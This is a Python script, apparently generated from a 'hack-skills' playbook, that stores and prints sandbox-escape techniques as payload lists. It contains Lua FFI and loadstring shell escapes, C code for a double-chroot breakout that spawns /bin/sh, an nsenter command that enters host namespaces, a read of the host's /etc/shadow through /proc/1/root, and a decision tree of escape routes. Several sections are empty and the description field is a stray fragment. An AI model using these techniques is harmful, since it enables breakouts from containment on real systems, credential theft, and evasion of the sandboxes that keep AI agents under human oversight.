#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/sandbox-escape-techniques

Skill: SKILL: Sandbox Escape — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-sandbox-escape-techniques.py --help
      python hack-skills-sandbox-escape-techniques.py --list
      python hack-skills-sandbox-escape-techniques.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/sandbox-escape-techniques'
TITLE = 'SKILL: Sandbox Escape — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: sandbox-escape-techniques", "description: >-", "Sandbox escape playbook. Use when breaking out of Python sandbox, Lua sandbox, seccomp filter, chroot jail, container/Docker, browser sandbox, or namespace isolation to achieve unrestricted code execution or file access."],
    'skill-sandbox-escape-expert-attack-playbook': [],
    '0-related-routing': ["- [browser-exploitation-v8](../browser-exploitation-v8/SKILL.md) \u2014 V8 exploitation for renderer RCE before browser sandbox escape", "- [container-escape-techniques](../container-escape-techniques/SKILL.md) \u2014 Docker/container specific escape techniques", "- [kernel-exploitation](../kernel-exploitation/SKILL.md) \u2014 kernel exploit for container/namespace escape", "- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) \u2014 post-escape privilege escalation"],
    'advanced-references': ["- [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) \u2014 Full pyjail methodology: `__builtins__` recovery, keyword bypass, AST bypass, pickle escape", "- [SECCOMP_BYPASS.md](./SECCOMP_BYPASS.md) \u2014 Architecture confusion, io_uring bypass, ptrace bypass, allowed syscall chaining"],
    '1-sandbox-type-identification': [],
    '2-python-sandbox-escape-overview': ["See [PYTHON_SANDBOX_ESCAPE.md](./PYTHON_SANDBOX_ESCAPE.md) for full methodology."],
    'quick-reference': [],
    '3-lua-sandbox-escape': [],
    'restricted-environment-bypass': ["```lua", "-- If debug library available:", "debug.getinfo(1)                    -- information leakage", "debug.getregistry()                 -- access global registry", "debug.getupvalue(func, 1)           -- read closed-over variables", "debug.setupvalue(func, 1, new_val)  -- overwrite upvalues", "-- Recover os module via debug:", "local getupvalue = debug.getupvalue", "-- Walk upvalues of known functions to find references to os/io", "-- If loadstring available:", "loadstring(\"os.execute('sh')\")()", "-- If string.dump available:", "-- Dump function bytecode, patch it, load modified function", "-- Metatables escape:", "-- If rawset/rawget blocked but __index/__newindex exists:", "-- Forge metatable chain to access restricted globals"],
    'lua-ffi-escape-luajit': ["```lua", "-- LuaJIT FFI provides C function access", "local ffi = require(\"ffi\")", "ffi.cdef[[ int system(const char *command); ]]", "ffi.C.system(\"sh\")", "-- If require is blocked but ffi is preloaded:", "-- Find ffi via package.loaded or debug.getregistry"],
    '4-chroot-escape': [],
    'double-chroot-escape': ["// Must be root inside chroot", "mkdir(\"/tmp/escape\", 0755);", "chroot(\"/tmp/escape\");          // new chroot inside old chroot", "// Old CWD is now outside the new chroot", "// Navigate up to real root:", "for (int i = 0; i < 100; i++) chdir(\"..\");", "chroot(\".\");                     // now at real root", "execl(\"/bin/sh\", \"sh\", NULL);"],
    '5-browser-sandbox-escape-overview': [],
    'chrome-sandbox-architecture-linux': ["Renderer Process:", "\u251c\u2500\u2500 seccomp-bpf (syscall filter)", "\u251c\u2500\u2500 PID namespace (isolated PIDs)", "\u251c\u2500\u2500 Network namespace (no direct network)", "\u251c\u2500\u2500 Mount namespace (minimal filesystem)", "\u2514\u2500\u2500 Reduced capabilities (no CAP_SYS_ADMIN etc.)"],
    'escape-vectors': [],
    'mojo-interface-attack-pattern': ["1. Renderer RCE achieved (via V8/Blink bug)", "2. Enumerate available Mojo interfaces from renderer", "3. Find vulnerable interface (UAF on message handling, integer overflow in parameter validation)", "4. Craft malicious Mojo message \u2192 trigger bug in browser process", "5. Browser process is unsandboxed \u2192 full system access"],
    '6-namespace-escape': [],
    'user-namespace-escalation': ["```bash"],
    'if-allowed-to-create-user-namespaces-unprivileged': ["unshare -Urm  # Create new user + mount namespace as root inside"],
    'inside-namespace-can-mount-modify-etc': [],
    'escape-requires-kernel-bug-or-misconfiguration': [],
    'pid-namespace-escape': ["```bash"],
    'if-proc-is-from-host-misconfigured-container': ["nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"],
    'enters-init-process-namespaces-host-access': [],
    'mount-namespace-tricks': ["```bash"],
    'if-can-see-host-filesystem-via-proc-1-root': ["ls -la /proc/1/root/  # host root filesystem", "cat /proc/1/root/etc/shadow  # read host files"],
    'if-can-mount': ["mount -t proc proc /proc"],
    'access-host-proc-entries': [],
    '7-rbash-restricted-shell-escape': [],
    '8-decision-tree': ["What type of sandbox?", "\u251c\u2500\u2500 Python sandbox (pyjail)?", "\u2502   \u2514\u2500\u2500 See PYTHON_SANDBOX_ESCAPE.md", "\u2502       \u251c\u2500\u2500 __builtins__ available? \u2192 direct import", "\u2502       \u251c\u2500\u2500 Subclass walk: ().__class__.__bases__[0].__subclasses__()", "\u2502       \u251c\u2500\u2500 Keywords filtered? \u2192 chr()/getattr() construction", "\u2502       \u2514\u2500\u2500 eval/exec available? \u2192 code object manipulation", "\u251c\u2500\u2500 Lua sandbox?", "\u2502   \u251c\u2500\u2500 debug library available? \u2192 getregistry/getupvalue", "\u2502   \u251c\u2500\u2500 FFI available (LuaJIT)? \u2192 ffi.C.system()", "\u2502   \u251c\u2500\u2500 loadstring available? \u2192 load arbitrary code", "\u2502   \u2514\u2500\u2500 All restricted? \u2192 metatable chain exploitation", "\u251c\u2500\u2500 seccomp filter?", "\u2502   \u2514\u2500\u2500 See SECCOMP_BYPASS.md", "\u2502       \u251c\u2500\u2500 Architecture confusion (32-bit syscalls from 64-bit)", "\u2502       \u251c\u2500\u2500 Allowed syscalls \u2192 ORW chain", "\u2502       \u251c\u2500\u2500 io_uring allowed? \u2192 bypass via io_uring", "\u2502       \u2514\u2500\u2500 ptrace allowed? \u2192 debug child process", "\u251c\u2500\u2500 chroot jail?", "\u2502   \u251c\u2500\u2500 Root inside chroot? \u2192 double chroot escape", "\u2502   \u251c\u2500\u2500 Leaked fd? \u2192 fchdir to real root", "\u2502   \u251c\u2500\u2500 /proc mounted? \u2192 /proc/1/root access", "\u2502   \u2514\u2500\u2500 Terminal access? \u2192 TIOCSTI injection", "\u251c\u2500\u2500 Container / Docker?", "\u2502   \u251c\u2500\u2500 Privileged container? \u2192 mount host, load kernel module", "\u2502   \u251c\u2500\u2500 Mounted docker.sock? \u2192 docker API \u2192 escape", "\u2502   \u251c\u2500\u2500 See ../container-escape-techniques/SKILL.md", "\u2502   \u2514\u2500\u2500 Kernel exploit \u2192 full escape", "\u251c\u2500\u2500 Browser sandbox?", "\u2502   \u251c\u2500\u2500 Have renderer RCE? \u2192 target Mojo IPC for browser escape", "\u2502   \u251c\u2500\u2500 GPU process accessible? \u2192 less-sandboxed stepping stone", "\u2502   \u2514\u2500\u2500 Kernel exploit \u2192 bypass sandbox entirely", "\u2514\u2500\u2500 Restricted shell (rbash)?", "\u2514\u2500\u2500 Find any interactive program (vi, less, python, awk, git)"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()